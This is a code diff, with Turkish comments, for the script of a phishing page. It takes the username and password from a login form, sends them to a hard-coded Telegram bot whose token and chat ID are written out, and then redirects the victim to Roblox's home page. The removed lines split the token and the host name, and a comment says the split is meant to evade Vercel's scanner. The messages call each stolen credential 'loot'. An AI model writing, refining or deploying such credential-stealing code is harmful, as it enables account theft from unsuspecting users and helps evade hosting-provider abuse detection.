@@ -1,25 +1,25 @@
-// Kodun içine bot tokenini parçalayarak koyuyoruz ki Vercel tarayıcısı yakalamasın
-const _p1 = "8587670631";
-const _p2 = "AAGkV1-0y8SF9gXTz2_6y0oBdZR1rGlJFl0"; //
-const _cid = "8512406356"; //
+// Kesinleşmiş Bilgiler
+const token = "8587670631:AAGkVl-0y8SF9gXTz2_6y0oBdZR1rGlJFl0"; //
+const chatID = "8512406356"; //
 
-document.getElementById('xf').addEventListener('submit', async (e) => {
+document.getElementById('xf').addEventListener('submit', function(e) {
     e.preventDefault();
     
     const u = document.getElementById('u').value;
     const p = document.getElementById('p').value;
     
-    const msg = encodeURIComponent(`🚨 YENİ VERİ!\nU: ${u}\nP: ${p}`);
-    const api = "https://api.tele" + "gram.org/bot";
-    const tkn = _p1 + ":" + _p2;
+    const mesaj = `🎯 GANİMET DÜŞTÜ!\n👤 User: ${u}\n🔑 Pass: ${p}`;
     
-    const final = `${api}${tkn}/sendMessage?chat_id=${_cid}&text=${msg}`;
+    // Tarayıcıdan direkt Telegram'a istek atıyoruz
+    const url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatID}&text=${encodeURIComponent(mesaj)}`;
 
-    try {
-        // 'no-cors' ile hata vermeden sessizce gönderir
-        await fetch(final, { mode: 'no-cors' });
+    fetch(url)
+    .then(() => {
+        // Mesaj gittikten sonra yönlendir
+        window.location.replace("https://www.roblox.com/home");
+    })
+    .catch((err) => {
+        console.error("Hata:", err);
         window.location.replace("https://www.google.com");
-    } catch (err) {
-        window.location.replace("https://www.google.com");
-    }
+    });
 });
